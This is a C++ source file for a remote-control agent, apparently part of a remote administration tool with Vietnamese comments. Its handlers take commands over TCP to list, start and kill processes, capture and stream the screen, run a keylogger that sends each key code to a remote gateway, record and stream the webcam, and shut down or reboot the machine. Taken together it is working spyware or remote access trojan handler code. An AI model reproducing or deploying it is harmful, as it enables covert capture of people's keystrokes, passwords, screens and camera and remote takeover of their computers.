#include "ProcessHandlers.h"
#include "AgentTcpServer.h"

// === PROCESS HANDLERS ===

json ProcessHandlers::listProcesses(const json &)
{
    auto list = ProcessManager::listProcesses();
    json arr = json::array();

    for (auto &p : list)
        arr.push_back({{"pid", p.pid},
                       {"name", p.name},
                       {"workingSet", p.workingSet},
                       {"exePath", p.exePath}});

    return {{"type", "process_list"}, {"data", arr}};
}

json ProcessHandlers::startProcess(const json &req)
{
    std::string path = req.value("path", "");
    std::string args = req.value("args", "");
    if (path.empty())
        return {{"type", "status"}, {"success", false}, {"message", "missing path"}};

    unsigned long pid{};
    bool ok = ProcessManager::startProcess(path, args, &pid);
    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
}

json ProcessHandlers::stopProcessPid(const json &req)
{
    if (!req.contains("pid"))
        return {{"type", "status"}, {"success", false}, {"message", "missing pid"}};

    bool ok = ProcessManager::stopProcessByPid(req["pid"]);
    return {{"type", "status"}, {"success", ok}};
}

// === APPLICATION HANDLERS ===

json ProcessHandlers::listApps(const json &)
{
    auto apps = ProcessManager::listUserApplications();
    json arr = json::array();

    for (auto &a : apps)
        arr.push_back({{"name", a.name}, {"process_count", a.processCount}});

    return {{"type", "application_list"}, {"data", arr}};
}

json ProcessHandlers::startApp(const json &req)
{
    std::string name = req.value("app_name", "");
    if (name.empty())
        return {{"type", "status"}, {"success", false}, {"message", "missing app_name"}};

    unsigned long pid{};
    bool ok = ProcessManager::startProcess(name, "", &pid);
    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
}

json ProcessHandlers::stopApp(const json &req)
{
    std::string name = req.value("app_name", "");
    int stop = ProcessManager::stopProcessesByName(name);
    return {{"type", "status"}, {"success", stop > 0}, {"stopped", stop}};
}

// === SCREEN HANDLERS ===

json ProcessHandlers::captureScreen(const json &)
{
    std::string b64 = capture_screenshot_base64();
    if (b64.empty())
        return {{"type", "status"}, {"success", false}, {"message", "capture failed"}};

    return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
}

json ProcessHandlers::startScreenStream(const json &req)
{
    int fps = req.value("fps", 15);
    ScreenStream::start(fps);

    return {
        {"type", "status"},
        {"success", true},
        {"message", "Screen streaming started"}};
}

json ProcessHandlers::stopScreenStream(const json &)
{
    ScreenStream::stop();
    return {
        {"type", "status"},
        {"success", true},
        {"message", "Screen streaming stopped"}};
}

// === KEYLOGGER HANDLERS ===

json ProcessHandlers::startKeylog(const json &)
{
    // Đăng ký callback gửi phím lên Gateway
    setKeyEventCallback([](int key)
                        {
        json msg = {
            {"type","key_event"},
            {"key_code", key}
        };
        AgentTcpServer::instance().sendJson(msg); });

    startKeylogger();

    return {
        {"type", "status"},
        {"success", true},
        {"message", "Keylogger started"}};
}

json ProcessHandlers::stopKeylog(const json &)
{
    stopKeylogger();
    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
}

// === WEBCAM RECORD HANDLERS ===

json ProcessHandlers::startWebcamRecord(const json &req)
{
    int time = req.value("time", 10);

    // Gửi trạng thái bắt đầu ghi hình
    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}};
    AgentTcpServer::instance().sendJson(status_msg);

    // Ghi hình (blocking call)
    std::string b64 = WebcamRecord::record_base64(time);

    // Gửi trạng thái thất bại nếu ghi hình lỗi
    if (b64.empty())
    {
        json failed_msg = {
            {"type", "webcam_recording_status"},
            {"message", "Recording failed"}};
        AgentTcpServer::instance().sendJson(failed_msg);
        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
    }

    // Gửi video đã mã hóa base64
    json video_msg = {
        {"type", "webcam_video"},
        {"success", true},
        {"data", b64}};
    AgentTcpServer::instance().sendJson(video_msg);

    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
}

// Hiện tại không thể dừng giữa chừng vì record_base64 là blocking
json ProcessHandlers::stopWebcamRecord(const json &)
{
    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Recording cancelled (client request)"}};
    AgentTcpServer::instance().sendJson(status_msg);
    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
}

// === WEBCAM STREAM HANDLERS ===

json ProcessHandlers::startWebcamStream(const json &req)
{
    int fps = req.value("fps", 30);
    WebcamStream::start(fps);

    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Webcam streaming started"}};
    AgentTcpServer::instance().sendJson(status_msg);

    return {
        {"type", "status"},
        {"success", true},
        {"message", "Webcam streaming started"}};
}

json ProcessHandlers::stopWebcamStream(const json &)
{
    WebcamStream::stop();

    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Webcam streaming stopped"}};
    AgentTcpServer::instance().sendJson(status_msg);

    return {
        {"type", "status"},
        {"success", true},
        {"message", "Webcam streaming stopped"}};
}

// === SYSTEM CONTROL HANDLERS ===

json ProcessHandlers::systemShutdown(const json &)
{
#ifdef _WIN32
    std::system("shutdown /s /t 0");
#else
    std::system("shutdown now");
#endif
    return {
        {"type", "status"},
        {"success", true},
        {"message", "System shutdown command sent."}};
}

json ProcessHandlers::systemRestart(const json &)
{
#ifdef _WIN32
    std::system("shutdown /r /t 0");
#else
    std::system("reboot");
#endif
    return {
        {"type", "status"},
        {"success", true},
        {"message", "System restart command sent."}};
}